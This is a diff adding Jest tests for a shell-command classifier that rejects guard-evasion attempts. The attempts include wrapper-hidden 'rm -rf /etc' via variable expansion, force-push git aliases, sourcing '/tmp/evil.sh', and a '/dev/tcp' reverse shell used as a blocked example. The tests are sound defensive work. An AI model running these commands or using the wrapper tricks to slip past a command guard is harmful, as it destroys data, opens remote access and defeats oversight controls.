@@ -1297,6 +1297,82 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("wrapper-command expansion bypass (round 12)", () => {
+    test("(CMD=rm; $CMD -rf /etc) subshell with expansion is rejected", () => {
+      expect(classifyCommand("CMD=rm; ($CMD -rf /etc)").ok).toBe(false);
+    });
+
+    test("{ $CMD -rf /etc; } brace-group expansion is rejected", () => {
+      expect(classifyCommand("{ $CMD -rf /etc; }").ok).toBe(false);
+    });
+
+    test("time $CMD -rf /etc (time wrapper) is rejected", () => {
+      expect(classifyCommand("time $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("env $CMD -rf /etc (env wrapper) is rejected", () => {
+      expect(classifyCommand("env $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("env VAR=1 $CMD -rf /etc (env with assignment) is rejected", () => {
+      expect(classifyCommand("env VAR=1 $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("command $CMD -rf /etc (command builtin) is rejected", () => {
+      expect(classifyCommand("command $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("sudo $CMD -rf /etc (sudo wrapper) is rejected", () => {
+      // Also matches sudo privilege-escalation pattern, but the wrapper
+      // unwrapping fires first.
+      expect(classifyCommand("sudo $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("nohup time env sudo $CMD /etc (deep wrapper chain) is rejected", () => {
+      expect(classifyCommand("nohup time env sudo $CMD /etc").ok).toBe(false);
+    });
+
+    test("time ls (benign time wrapper is still allowed)", () => {
+      expect(classifyCommand("time ls").ok).toBe(true);
+    });
+  });
+
+  describe("persistent git config alias writes (round 12)", () => {
+    test('git config alias.pu "push --force" is rejected', () => {
+      expect(classifyCommand('git config alias.pu "push --force"').ok).toBe(false);
+    });
+
+    test("git config --global alias.pu 'push --force' is rejected", () => {
+      expect(classifyCommand("git config --global alias.pu 'push --force'").ok).toBe(false);
+    });
+
+    test("git config --system alias.pu push is rejected", () => {
+      expect(classifyCommand("git config --system alias.pu push").ok).toBe(false);
+    });
+
+    test("git config --add include.path /tmp/evil.cfg is rejected", () => {
+      expect(classifyCommand("git config --add include.path /tmp/evil.cfg").ok).toBe(false);
+    });
+
+    test("git config user.name alice (benign key) is allowed", () => {
+      expect(classifyCommand("git config user.name alice").ok).toBe(true);
+    });
+  });
+
+  describe("source/dot inside wrapper builtins (round 12)", () => {
+    test("command source /tmp/evil.sh is rejected", () => {
+      expect(classifyCommand("command source /tmp/evil.sh").ok).toBe(false);
+    });
+
+    test("builtin . /tmp/evil.sh is rejected", () => {
+      expect(classifyCommand("builtin . /tmp/evil.sh").ok).toBe(false);
+    });
+
+    test("time source /tmp/evil.sh is rejected", () => {
+      expect(classifyCommand("time source /tmp/evil.sh").ok).toBe(false);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
